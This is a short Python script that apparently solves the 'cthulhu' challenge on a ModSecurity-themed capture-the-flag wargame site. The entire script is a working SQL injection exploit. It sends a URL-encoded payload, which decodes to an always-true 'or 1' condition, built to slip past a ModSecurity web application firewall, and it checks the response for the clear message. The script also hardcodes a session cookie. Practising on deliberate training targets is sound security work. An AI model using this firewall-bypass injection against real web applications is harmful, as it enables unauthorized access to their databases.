import requests

url = "https://modsec.rubiya.kr/chall/cthulhu_c26ae41c4af4c2d7b21c19cbb9009604.php?"
cookie = {'PHPSESSID':'pug9dnqndkn502s09mds1uiu9o'}

def solve():
    query = "id=%27%3C%40%3D1%20or%201--%20"
    res = requests.get(url=url+query,cookies=cookie)
    if "CTHULHU Clear!" in res.text:
        print("CTHULHU Clear!")

if __name__ == "__main__":
    solve()
